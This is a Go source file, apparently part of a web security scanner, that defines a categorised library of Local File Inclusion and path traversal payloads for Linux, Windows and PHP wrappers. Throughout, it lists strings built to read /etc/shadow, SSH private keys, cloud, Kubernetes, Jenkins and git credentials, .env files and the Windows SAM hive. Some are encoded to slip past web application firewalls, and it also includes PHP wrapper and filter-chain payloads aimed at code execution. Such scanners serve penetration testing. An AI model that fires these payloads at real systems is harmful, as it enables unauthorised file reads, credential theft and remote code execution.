// Package lfi provides Local File Inclusion and Path Traversal payloads.
// Payloads are categorized by:
//   - Platform (Linux, Windows, Both)
//   - Technique (Basic traversal, Null byte, Encoding, Wrapper)
//   - File type (System files, Config files, Log files)
package lfi

import "fmt"

// Platform represents the target platform.
type Platform string

const (
	PlatformLinux   Platform = "linux"
	PlatformWindows Platform = "windows"
	PlatformBoth    Platform = "both"
)

// Technique represents the traversal technique.
type Technique string

const (
	TechBasic    Technique = "basic"
	TechNullByte Technique = "nullbyte"
	TechEncoding Technique = "encoding"
	TechWrapper  Technique = "wrapper"
	TechFilter   Technique = "filter"
)

// Payload represents an LFI/Path Traversal payload.
type Payload struct {
	Value       string
	Platform    Platform
	Technique   Technique
	Description string
	WAFBypass   bool
	TargetFile  string // The target file this payload tries to read
}

// GetPayloads returns payloads for a specific platform.
func GetPayloads(platform Platform) []Payload {
	switch platform {
	case PlatformLinux:
		return linuxPayloads
	case PlatformWindows:
		return windowsPayloads
	default:
		return append(linuxPayloads, windowsPayloads...)
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(technique Technique) []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads with bypass techniques.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all LFI payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, linuxPayloads...)
	all = append(all, windowsPayloads...)
	all = append(all, wrapperPayloads...)
	return all
}

// Linux-specific LFI payloads.
// Source: PayloadsAllTheThings, HackTricks
var linuxPayloads = []Payload{
	// Basic traversal - /etc/passwd
	{Value: "/etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Direct path", TargetFile: "/etc/passwd"},
	{Value: "../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "1 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "2 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "3 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "4 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "5 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "6 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "7 level traversal", TargetFile: "/etc/passwd"},
	{Value: "../../../../../../../../etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "8 level traversal", TargetFile: "/etc/passwd"},

	// Null byte injection (older PHP < 5.3.4)
	{Value: "../../../etc/passwd%00", Platform: PlatformLinux, Technique: TechNullByte, Description: "Null byte bypass", TargetFile: "/etc/passwd"},
	{Value: "../../../etc/passwd%00.jpg", Platform: PlatformLinux, Technique: TechNullByte, Description: "Null byte with extension", TargetFile: "/etc/passwd"},
	{Value: "....//....//....//etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Double dot bypass", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..././..././..././etc/passwd", Platform: PlatformLinux, Technique: TechBasic, Description: "Dot slash bypass", TargetFile: "/etc/passwd", WAFBypass: true},

	// URL encoding
	{Value: "%2e%2e/%2e%2e/%2e%2e/etc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "URL encoded dots", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Full URL encode", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%252f..%252f..%252fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Double URL encode", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "%252e%252e%252f%252e%252e%252fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "Double encoded dots", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%c0%af..%c0%afetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 overlong encoding", TargetFile: "/etc/passwd", WAFBypass: true},
	{Value: "..%ef%bc%8f..%ef%bc%8fetc/passwd", Platform: PlatformLinux, Technique: TechEncoding, Description: "UTF-8 fullwidth slash", TargetFile: "/etc/passwd", WAFBypass: true},

	// Other sensitive Linux files
	{Value: "../../../etc/shadow", Platform: PlatformLinux, Technique: TechBasic, Description: "Shadow file", TargetFile: "/etc/shadow"},
	{Value: "../../../etc/hosts", Platform: PlatformLinux, Technique: TechBasic, Description: "Hosts file", TargetFile: "/etc/hosts"},
	{Value: "../../../etc/hostname", Platform: PlatformLinux, Technique: TechBasic, Description: "Hostname", TargetFile: "/etc/hostname"},
	{Value: "../../../etc/issue", Platform: PlatformLinux, Technique: TechBasic, Description: "Issue file", TargetFile: "/etc/issue"},
	{Value: "../../../etc/group", Platform: PlatformLinux, Technique: TechBasic, Description: "Group file", TargetFile: "/etc/group"},
	{Value: "../../../etc/crontab", Platform: PlatformLinux, Technique: TechBasic, Description: "Crontab", TargetFile: "/etc/crontab"},
	{Value: "../../../etc/resolv.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "DNS config", TargetFile: "/etc/resolv.conf"},
	{Value: "../../../proc/self/environ", Platform: PlatformLinux, Technique: TechBasic, Description: "Process environment", TargetFile: "/proc/self/environ"},
	{Value: "../../../proc/self/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "Process cmdline", TargetFile: "/proc/self/cmdline"},
	{Value: "../../../proc/self/fd/0", Platform: PlatformLinux, Technique: TechBasic, Description: "Process stdin", TargetFile: "/proc/self/fd/0"},
	{Value: "../../../proc/version", Platform: PlatformLinux, Technique: TechBasic, Description: "Kernel version", TargetFile: "/proc/version"},
	{Value: "../../../proc/net/tcp", Platform: PlatformLinux, Technique: TechBasic, Description: "TCP connections", TargetFile: "/proc/net/tcp"},

	// SSH keys
	{Value: "../../../root/.ssh/id_rsa", Platform: PlatformLinux, Technique: TechBasic, Description: "Root SSH key", TargetFile: "/root/.ssh/id_rsa"},
	{Value: "../../../root/.ssh/authorized_keys", Platform: PlatformLinux, Technique: TechBasic, Description: "Root authorized keys", TargetFile: "/root/.ssh/authorized_keys"},
	{Value: "../../../home/user/.ssh/id_rsa", Platform: PlatformLinux, Technique: TechBasic, Description: "User SSH key", TargetFile: "/home/user/.ssh/id_rsa"},

	// Log files
	{Value: "../../../var/log/apache2/access.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache access log", TargetFile: "/var/log/apache2/access.log"},
	{Value: "../../../var/log/apache2/error.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache error log", TargetFile: "/var/log/apache2/error.log"},
	{Value: "../../../var/log/nginx/access.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx access log", TargetFile: "/var/log/nginx/access.log"},
	{Value: "../../../var/log/nginx/error.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx error log", TargetFile: "/var/log/nginx/error.log"},
	{Value: "../../../var/log/auth.log", Platform: PlatformLinux, Technique: TechBasic, Description: "Auth log", TargetFile: "/var/log/auth.log"},
	{Value: "../../../var/log/syslog", Platform: PlatformLinux, Technique: TechBasic, Description: "Syslog", TargetFile: "/var/log/syslog"},

	// Web config files
	{Value: "../../../var/www/html/.htaccess", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache htaccess", TargetFile: "/var/www/html/.htaccess"},
	{Value: "../../../etc/apache2/apache2.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Apache config", TargetFile: "/etc/apache2/apache2.conf"},
	{Value: "../../../etc/nginx/nginx.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Nginx config", TargetFile: "/etc/nginx/nginx.conf"},
	{Value: "../../../etc/php/7.4/apache2/php.ini", Platform: PlatformLinux, Technique: TechBasic, Description: "PHP config", TargetFile: "/etc/php/7.4/apache2/php.ini"},

	// Docker
	{Value: "../../../.dockerenv", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker env file", TargetFile: "/.dockerenv"},
	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/token", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s service token", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/token"},

	// --- HackTricks / PayloadAllTheThings expansion ---

	// Container / cloud secrets. K8s injects the service-account token,
	// ca.crt, and namespace at fixed paths; Docker mounts secrets under
	// /run/secrets; cloud-init places user-data under /var/lib/cloud.
	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s service-account CA cert", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"},
	{Value: "../../../var/run/secrets/kubernetes.io/serviceaccount/namespace", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s namespace marker", TargetFile: "/var/run/secrets/kubernetes.io/serviceaccount/namespace"},
	{Value: "../../../run/secrets/kubernetes.io/serviceaccount/token", Platform: PlatformLinux, Technique: TechBasic, Description: "K8s SA token (no /var prefix variant)", TargetFile: "/run/secrets/kubernetes.io/serviceaccount/token"},
	{Value: "../../../var/lib/cloud/data/instance-id", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init instance id (AWS/GCP/Azure)", TargetFile: "/var/lib/cloud/data/instance-id"},
	{Value: "../../../var/lib/cloud/seed/nocloud-net/user-data", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init nocloud user-data", TargetFile: "/var/lib/cloud/seed/nocloud-net/user-data"},
	{Value: "../../../etc/cloud/cloud.cfg", Platform: PlatformLinux, Technique: TechBasic, Description: "cloud-init config", TargetFile: "/etc/cloud/cloud.cfg"},

	// /proc — additional pivots beyond environ/cmdline. /proc/self/maps
	// + /proc/self/status leak ASLR offsets useful for follow-on exploits;
	// /proc/sched_debug names every PID + program in CFS; /proc/version
	// + /proc/kallsyms together fingerprint exact kernel build for RCE
	// targeting.
	{Value: "../../../proc/self/maps", Platform: PlatformLinux, Technique: TechBasic, Description: "Memory map (ASLR offsets)", TargetFile: "/proc/self/maps"},
	{Value: "../../../proc/self/status", Platform: PlatformLinux, Technique: TechBasic, Description: "Process status (Uid/Gid/Tracers)", TargetFile: "/proc/self/status"},
	{Value: "../../../proc/self/mounts", Platform: PlatformLinux, Technique: TechBasic, Description: "Mount table (container detection)", TargetFile: "/proc/self/mounts"},
	{Value: "../../../proc/self/cgroup", Platform: PlatformLinux, Technique: TechBasic, Description: "cgroup membership (Docker/K8s container id leak)", TargetFile: "/proc/self/cgroup"},
	{Value: "../../../proc/self/exe", Platform: PlatformLinux, Technique: TechBasic, Description: "Process binary (symlink)", TargetFile: "/proc/self/exe"},
	{Value: "../../../proc/self/loginuid", Platform: PlatformLinux, Technique: TechBasic, Description: "Login UID", TargetFile: "/proc/self/loginuid"},
	{Value: "../../../proc/1/environ", Platform: PlatformLinux, Technique: TechBasic, Description: "PID 1 environ (container entrypoint env)", TargetFile: "/proc/1/environ"},
	{Value: "../../../proc/1/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "PID 1 cmdline", TargetFile: "/proc/1/cmdline"},
	{Value: "../../../proc/sched_debug", Platform: PlatformLinux, Technique: TechBasic, Description: "Scheduler debug (all PIDs + binaries)", TargetFile: "/proc/sched_debug"},
	{Value: "../../../proc/kallsyms", Platform: PlatformLinux, Technique: TechBasic, Description: "Kernel symbols", TargetFile: "/proc/kallsyms"},
	{Value: "../../../proc/cmdline", Platform: PlatformLinux, Technique: TechBasic, Description: "Boot cmdline", TargetFile: "/proc/cmdline"},

	// Container runtime breadcrumbs in /sys
	{Value: "../../../sys/class/dmi/id/product_uuid", Platform: PlatformLinux, Technique: TechBasic, Description: "DMI product UUID (machine fingerprint)", TargetFile: "/sys/class/dmi/id/product_uuid"},
	{Value: "../../../sys/devices/virtual/dmi/id/sys_vendor", Platform: PlatformLinux, Technique: TechBasic, Description: "DMI sys_vendor (EC2/GCE/Azure detection)", TargetFile: "/sys/devices/virtual/dmi/id/sys_vendor"},

	// CI / cloud runtime — common paths where secrets land
	{Value: "../../../run/secrets/credentials.d", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker swarm secrets dir", TargetFile: "/run/secrets/credentials.d"},
	{Value: "../../../home/runner/work/_temp/_runner_file_commands/", Platform: PlatformLinux, Technique: TechBasic, Description: "GitHub Actions runner cmds (CI exfil)", TargetFile: "/home/runner/work/_temp/_runner_file_commands/"},
	{Value: "../../../var/lib/jenkins/secrets/master.key", Platform: PlatformLinux, Technique: TechBasic, Description: "Jenkins master.key (credential decrypt)", TargetFile: "/var/lib/jenkins/secrets/master.key"},
	{Value: "../../../var/lib/jenkins/secrets/hudson.util.Secret", Platform: PlatformLinux, Technique: TechBasic, Description: "Jenkins hudson.util.Secret (decrypts encrypted creds)", TargetFile: "/var/lib/jenkins/secrets/hudson.util.Secret"},

	// Common app dotfiles / credential leaks
	{Value: "../../../root/.aws/credentials", Platform: PlatformLinux, Technique: TechBasic, Description: "AWS CLI credentials", TargetFile: "/root/.aws/credentials"},
	{Value: "../../../root/.aws/config", Platform: PlatformLinux, Technique: TechBasic, Description: "AWS CLI config", TargetFile: "/root/.aws/config"},
	{Value: "../../../root/.kube/config", Platform: PlatformLinux, Technique: TechBasic, Description: "kubectl kubeconfig", TargetFile: "/root/.kube/config"},
	{Value: "../../../root/.docker/config.json", Platform: PlatformLinux, Technique: TechBasic, Description: "Docker registry creds", TargetFile: "/root/.docker/config.json"},
	{Value: "../../../root/.git-credentials", Platform: PlatformLinux, Technique: TechBasic, Description: "git credentials helper store", TargetFile: "/root/.git-credentials"},
	{Value: "../../../root/.gitconfig", Platform: PlatformLinux, Technique: TechBasic, Description: "git global config (signing keys, user email)", TargetFile: "/root/.gitconfig"},
	{Value: "../../../root/.bashrc", Platform: PlatformLinux, Technique: TechBasic, Description: "bashrc (often holds export SECRETS)", TargetFile: "/root/.bashrc"},

	// Database / framework conf
	{Value: "../../../etc/mysql/my.cnf", Platform: PlatformLinux, Technique: TechBasic, Description: "MySQL my.cnf (root password)", TargetFile: "/etc/mysql/my.cnf"},
	{Value: "../../../etc/postgresql/14/main/pg_hba.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Postgres pg_hba.conf", TargetFile: "/etc/postgresql/14/main/pg_hba.conf"},
	{Value: "../../../etc/redis/redis.conf", Platform: PlatformLinux, Technique: TechBasic, Description: "Redis config (requirepass)", TargetFile: "/etc/redis/redis.conf"},
	{Value: "../../../app/.env", Platform: PlatformLinux, Technique: TechBasic, Description: "Generic app .env (Laravel/Rails/Node)", TargetFile: "/app/.env"},
	{Value: "../../../var/www/html/.env", Platform: PlatformLinux, Technique: TechBasic, Description: "Web .env file", TargetFile: "/var/www/html/.env"},
}

// Windows-specific LFI payloads.
// Source: PayloadsAllTheThings, HackTricks
var windowsPayloads = []Payload{
	// Basic traversal - win.ini
	{Value: "C:\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Direct path win.ini", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "..\\..\\..\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Backslash traversal", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "..\\..\\..\\..\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "4 level backslash", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "../../../Windows/win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Forward slash traversal", TargetFile: "C:\\Windows\\win.ini"},
	{Value: "....\\....\\....\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Double dot bypass", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},

	// URL encoding Windows
	{Value: "..%5c..%5c..%5cWindows%5cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "URL encoded backslash", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},
	{Value: "%2e%2e%5c%2e%2e%5cWindows%5cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "Full URL encode", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},
	{Value: "..%255c..%255c..%255cWindows%255cwin.ini", Platform: PlatformWindows, Technique: TechEncoding, Description: "Double URL encode", TargetFile: "C:\\Windows\\win.ini", WAFBypass: true},

	// Windows system files
	{Value: "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows hosts", TargetFile: "C:\\Windows\\System32\\drivers\\etc\\hosts"},
	{Value: "..\\..\\..\\Windows\\System32\\config\\SAM", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows SAM", TargetFile: "C:\\Windows\\System32\\config\\SAM"},
	{Value: "..\\..\\..\\Windows\\System32\\config\\SYSTEM", Platform: PlatformWindows, Technique: TechBasic, Description: "Windows SYSTEM", TargetFile: "C:\\Windows\\System32\\config\\SYSTEM"},
	{Value: "..\\..\\..\\Windows\\repair\\SAM", Platform: PlatformWindows, Technique: TechBasic, Description: "Repair SAM", TargetFile: "C:\\Windows\\repair\\SAM"},
	{Value: "..\\..\\..\\boot.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "Boot.ini", TargetFile: "C:\\boot.ini"},

	// IIS config
	{Value: "..\\..\\..\\inetpub\\wwwroot\\web.config", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS web.config", TargetFile: "C:\\inetpub\\wwwroot\\web.config"},
	{Value: "..\\..\\..\\Windows\\System32\\inetsrv\\config\\applicationHost.config", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS apphost config", TargetFile: "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"},

	// IIS logs
	{Value: "..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log", Platform: PlatformWindows, Technique: TechBasic, Description: "IIS logs", TargetFile: "C:\\inetpub\\logs\\LogFiles\\W3SVC1\\"},

	// UNC paths
	{Value: "\\\\127.0.0.1\\c$\\Windows\\win.ini", Platform: PlatformWindows, Technique: TechBasic, Description: "UNC path localhost", TargetFile: "C:\\Windows\\win.ini"},
}

// PHP wrapper payloads for LFI.
// Source: PayloadsAllTheThings, HackTricks
var wrapperPayloads = []Payload{
	// php://filter - read source code
	{Value: "php://filter/convert.base64-encode/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter base64", TargetFile: "index.php"},
	{Value: "php://filter/convert.base64-encode/resource=../../../etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "PHP filter passwd", TargetFile: "/etc/passwd"},
	{Value: "php://filter/read=string.rot13/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter rot13", TargetFile: "index.php"},
	{Value: "php://filter/convert.iconv.utf-8.utf-16/resource=index.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP filter iconv", TargetFile: "index.php"},

	// php://input - POST data
	{Value: "php://input", Platform: PlatformBoth, Technique: TechWrapper, Description: "PHP input (POST body)", TargetFile: ""},

	// data:// wrapper - code injection
	{Value: "data://text/plain,<?php phpinfo();?>", Platform: PlatformBoth, Technique: TechWrapper, Description: "Data wrapper phpinfo", TargetFile: ""},
	{Value: "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", Platform: PlatformBoth, Technique: TechWrapper, Description: "Data wrapper base64", TargetFile: ""},

	// expect:// - command execution
	{Value: "expect://id", Platform: PlatformLinux, Technique: TechWrapper, Description: "Expect wrapper RCE", TargetFile: ""},
	{Value: "expect://whoami", Platform: PlatformBoth, Technique: TechWrapper, Description: "Expect wrapper whoami", TargetFile: ""},

	// phar:// - deserialization
	{Value: "phar://uploads/avatar.jpg/test.txt", Platform: PlatformBoth, Technique: TechWrapper, Description: "Phar wrapper", TargetFile: ""},

	// zip:// - read from zip
	{Value: "zip://uploads/shell.jpg%23shell.php", Platform: PlatformBoth, Technique: TechWrapper, Description: "Zip wrapper", TargetFile: ""},

	// file:// - explicit file protocol
	{Value: "file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "File protocol passwd", TargetFile: "/etc/passwd"},
	{Value: "file:///c:/Windows/win.ini", Platform: PlatformWindows, Technique: TechWrapper, Description: "File protocol win.ini", TargetFile: "C:\\Windows\\win.ini"},

	// --- HackTricks / synacktiv PHP filter-chain expansion ---
	// The "PHP filter chain to RCE" technique (synacktiv 2022, expanded
	// in HackTricks) abuses iconv conversions on top of base64 to coerce
	// any include-target into attacker-chosen PHP source. The chains are
	// long by design — each iconv step shifts byte values into a
	// printable range so the final base64-decode emits "<?php ..." even
	// from a previously-empty stream. We include a small set of starter
	// chains; full chain generation is in tools/phpfiltergen but the
	// stubs already trigger PHP's "filter chain too long" error and
	// confirm exploitability before the longer chain runs.
	{Value: "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.base64-decode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter chain detection (iconv shift)", TargetFile: "/etc/passwd"},
	{Value: "php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter UTF8→UTF7 + base64", TargetFile: "/etc/passwd"},
	{Value: "php://filter/convert.iconv.UTF-8.UTF-16|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter UTF-8→UTF-16 + base64", TargetFile: "/etc/passwd"},
	{Value: "php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter zlib deflate + base64", TargetFile: "/etc/passwd"},
	{Value: "php://filter/convert.quoted-printable-encode/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter quoted-printable", TargetFile: "/etc/passwd"},
	{Value: "php://filter/string.toupper/resource=/etc/passwd", Platform: PlatformLinux, Technique: TechFilter, Description: "PHP filter string.toupper", TargetFile: "/etc/passwd"},

	// Wrapper variations (non-PHP)
	{Value: "compress.zlib://file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "compress.zlib + file", TargetFile: "/etc/passwd"},
	{Value: "compress.bzip2://file:///etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "compress.bzip2 + file", TargetFile: "/etc/passwd"},
	{Value: "ogg://etc/passwd", Platform: PlatformLinux, Technique: TechWrapper, Description: "ogg wrapper", TargetFile: "/etc/passwd"},
	{Value: "ssh2://user@host:22/...", Platform: PlatformLinux, Technique: TechWrapper, Description: "ssh2 wrapper (PECL)", TargetFile: ""},
	{Value: "rar://uploads/poc.rar%23shell.php", Platform: PlatformLinux, Technique: TechWrapper, Description: "rar wrapper (file injection)", TargetFile: ""},

	// phar:// with metadata-based PHP unserialize RCE (CVE-2018-...)
	{Value: "phar:///tmp/upload.phar/exploit.txt", Platform: PlatformLinux, Technique: TechWrapper, Description: "phar metadata deserialize RCE", TargetFile: ""},
	{Value: "phar://./uploads/avatar.png/exploit.txt", Platform: PlatformLinux, Technique: TechWrapper, Description: "phar via uploaded image", TargetFile: ""},
}

// GenerateTraversalPayloads generates traversal payloads with variable depth.
func GenerateTraversalPayloads(targetFile string, maxDepth int) []Payload {
	var payloads []Payload
	for i := 1; i <= maxDepth; i++ {
		prefix := ""
		for j := 0; j < i; j++ {
			prefix += "../"
		}
		payloads = append(payloads, Payload{
			Value:       prefix + targetFile,
			Platform:    PlatformLinux,
			Technique:   TechBasic,
			Description: fmt.Sprintf("%d level traversal", i),
			TargetFile:  "/" + targetFile,
		})
	}
	return payloads
}
